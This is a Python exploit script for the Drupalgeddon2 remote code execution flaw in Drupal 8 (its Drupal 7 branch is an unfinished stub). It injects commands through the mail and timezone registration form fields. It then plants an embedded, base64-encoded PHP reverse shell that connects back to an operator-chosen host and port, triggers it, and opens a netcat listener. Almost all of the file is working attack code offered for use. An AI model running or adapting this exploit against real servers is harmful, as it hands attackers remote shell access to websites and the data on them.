#!/usr/bin/env python3
#PHP reverse shell taken from https://github.com/pentestmonkey/php-reverse-shell

import subprocess
import threading
import time
import requests
import re
import argparse
import random
import string
import urllib.parse
import base64

banner = """
'########::'########::'##::::'##:'########:::::'###::::'##:::::::
 ##.... ##: ##.... ##: ##:::: ##: ##.... ##:::'## ##::: ##:::::::
 ##:::: ##: ##:::: ##: ##:::: ##: ##:::: ##::'##:. ##:: ##:::::::
 ##:::: ##: ########:: ##:::: ##: ########::'##:::. ##: ##:::::::
 ##:::: ##: ##.. ##::: ##:::: ##: ##.....::: #########: ##:::::::
 ##:::: ##: ##::. ##:: ##:::: ##: ##:::::::: ##.... ##: ##:::::::
 ########:: ##:::. ##:. #######:: ##:::::::: ##:::: ##: ########:
........:::..:::::..:::.......:::..:::::::::..:::::..::........::
:'######:::'########:'########::'########:::'#######::'##::: ##::'#######::
'##... ##:: ##.....:: ##.... ##: ##.... ##:'##.... ##: ###:: ##:'##.... ##:
 ##:::..::: ##::::::: ##:::: ##: ##:::: ##: ##:::: ##: ####: ##:..::::: ##:
 ##::'####: ######::: ##:::: ##: ##:::: ##: ##:::: ##: ## ## ##::'#######::
 ##::: ##:: ##...:::: ##:::: ##: ##:::: ##: ##:::: ##: ##. ####:'##::::::::
 ##::: ##:: ##::::::: ##:::: ##: ##:::: ##: ##:::: ##: ##:. ###: ##::::::::
. ######::: ########: ########:: ########::. #######:: ##::. ##: #########:
:......::::........::........:::........::::.......:::..::::..::.........::

+-+-+ +-+-+-+-+-+
|B|y| |v|r|v|i|k|
+-+-+ +-+-+-+-+-+
"""

def get_random_string(length):
    # Random string with the combination of lower and upper case
	letters = string.ascii_letters
	random_str = ''.join(random.choice(letters) for i in range(length))
	return random_str

def is_host_alive(base_url):
    resp = requests.get(base_url, verify=False)
    if resp.status_code == 200:
        xgen = resp.headers['X-Generator']
        return xgen[7:8]
    else:
        return False

def vuln_check(base_url, version):
    global random_str_for_init_check
    random_str_for_init_check = get_random_string(8)
    elements = {
        '7': {
            'name': False
            },
        '8': {
            'mail': False,
            'timezone': False
            }
    }
    
    headers = {
            'User-Agent': 'drupalgeddon2',
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
    #vuln_flag = False
    for ver in elements.keys():
        if ver == '7' and ver == version:
            for element in elements[ver]:
                #url = base_url + '/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
                print('DRUPAL 7 PART YET TO BE CODED!!!!!')
                exit()
        elif ver == '8'  and ver == version:
            for element in elements[ver].keys():
                if element == 'mail':
                    url = base_url + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
                    payload = f'form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=exec&mail[a][#type]=markup&mail[a][#markup]=echo+"pwned"+|+tee+{random_str_for_init_check}.txt'
                    vuln_check_post = requests.post(url, headers=headers, data=payload, verify=False)
                    if vuln_check_post.status_code == 200:
                        check_uploaded_payload = requests.get(base_url + '/' + random_str_for_init_check + '.txt', verify=False)
                        if check_uploaded_payload.status_code == 200 and check_uploaded_payload.content.decode('utf-8').strip() == 'pwned':
                            elements[ver][element] = True
                elif element == 'timezone' and not elements[ver]['mail']:
                    url = base_url + '/user/register?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
                    payload = f'form_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]=exec&timezone[a][#lazy_builder][][]=echo+"pwned"+|+tee+{random_str_for_init_check}.txt'
                    vuln_check_post = requests.post(url, headers=headers, data=payload, verify=False)
                    if vuln_check_post.status_code == 500:
                        check_uploaded_payload = requests.get(base_url + '/' + random_str_for_init_check + '.txt', verify=False)
                        if check_uploaded_payload.status_code == 200 and check_uploaded_payload.content.decode('utf-8').strip() == 'pwned':
                            elements[ver][element] = True
    return elements
        
    
def upload(base_url, lhost, lport, version, method):
    global random_str_for_rev_payload
    random_str_for_rev_payload = get_random_string(8)
    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    if version == '7':
        pass
    elif version == '8':
        php_reverse_shell = """
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '%s';
$port = %s;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
    // Fork and have the parent process exit
    $pid = pcntl_fork();
    
    if ($pid == -1) {
        printit("ERROR: Can't fork");
        exit(1);
    }
    
    if ($pid) {
        exit(0);  // Parent exits
    }

    // Make the current process a session leader
    // Will only succeed if we forked
    if (posix_setsid() == -1) {
        printit("Error: Can't setsid()");
        exit(1);
    }

    $daemon = 1;
} else {
    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
    // Check for end of TCP connection
    if (feof($sock)) {
        printit("ERROR: Shell connection terminated");
        break;
    }

    // Check for end of STDOUT
    if (feof($pipes[1])) {
        printit("ERROR: Shell process terminated");
        break;
    }

    // Wait until a command is end down $sock, or some
    // command output is available on STDOUT or STDERR
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    // If we can read from the TCP socket, send
    // data to process's STDIN
    if (in_array($sock, $read_a)) {
        if ($debug) printit("SOCK READ");
        $input = fread($sock, $chunk_size);
        if ($debug) printit("SOCK: $input");
        fwrite($pipes[0], $input);
    }

    // If we can read from the process's STDOUT
    // send data down tcp connection
    if (in_array($pipes[1], $read_a)) {
        if ($debug) printit("STDOUT READ");
        $input = fread($pipes[1], $chunk_size);
        if ($debug) printit("STDOUT: $input");
        fwrite($sock, $input);
    }

    // If we can read from the process's STDERR
    // send data down tcp connection
    if (in_array($pipes[2], $read_a)) {
        if ($debug) printit("STDERR READ");
        $input = fread($pipes[2], $chunk_size);
        if ($debug) printit("STDERR: $input");
        fwrite($sock, $input);
    }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
    if (!$daemon) {
        print "$string\n";
    }
}

?> 
"""%(lhost,lport)
        reverse_shell = php_reverse_shell.encode('ascii')
        enc_reverse_shell = base64.b64encode(reverse_shell).decode('utf-8')
        rev_payload = urllib.parse.quote_plus(f'echo {enc_reverse_shell}  | base64 -d | tee {random_str_for_rev_payload}.php')
        if method == 'mail':
            url = base_url + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
            payload = f'form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=exec&mail[a][#type]=markup&mail[a][#markup]={rev_payload}'
        elif method == 'timezone':
            url = base_url + '/user/register?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
            payload = f'form_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]=exec&timezone[a][#lazy_builder][][]={rev_payload}'
    rev_payload_upload = requests.post(url, headers=headers, data=payload, verify=False)
    
    return True if rev_payload_upload.status_code == 200 else False

def exploit(base_url):
    time.sleep(5)
    url = base_url + '/' + random_str_for_rev_payload + '.php'
    requests.get(url, verify=False)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', type=str, required=True, help='Target URL, example: http://10.10.10.10', dest='target')
    parser.add_argument('-l', type=str, required=True, help='localhost IP to listen on', dest='lhost')
    parser.add_argument('-p', type=str, required=True, help='localhost Port to listen on', dest='lport')
    args = parser.parse_args()
    print(banner)
    if args.target is None or args.lhost is None or args.lport is None:
        parser.print_help()
        exit()
    if bool(re.search('[hH][tT][tT][pP][sS]?\:\/\/', args.target)) == False:
        print('There is something wrong with the URL, it needs to have http://\n\n')
        exit()
    version = is_host_alive(args.target)
    if version:
        print(f'Drupal Installation detected on the given target.\n')
        print(f"Look's like the target is running Drupal version:{version}\n")
        print('Checking if the target is vulnerable...\n')
        vuln_flags = vuln_check(args.target, version)
        vuln_method = ''
        for element in vuln_flags[version]:
            if vuln_flags[version][element]:
                vuln_method = element
                break
        if vuln_method:
            print(f'\nInitial Vuln check on the target success!!! Target is vulnerable to {vuln_method}!!!\nMoving on with uploading the actual reverse shell...\n')
            if upload(args.target, args.lhost, args.lport, version, vuln_method):
                print(f'\nReverse Shell Payload uploaded successfully to {args.target}/{random_str_for_rev_payload}.php\n')
                print('\nHold On!!!! Triggering this payload\n')
                z = threading.Thread(target=exploit, args=(args.target,))
                z.daemon = True
                z.start()
                print(f'Starting a listener on port {args.lport}, Please wait... this might take a few seconds.\n')
                try:
                    subprocess.run('nc -nlvp ' + args.lport, shell=True)
                except Exception as e:
                   print(f'\nException Occured: {e}')
            else:
                print("\nFailed to upload the reverse shell\n")
                exit()
        else:
            print("\nGiven Target is not Vulnerable.\n")
            exit()    
    else:
        print("\nCannot find any Drupal Installation on the given URL, check the URL and try again.\n")
        exit()
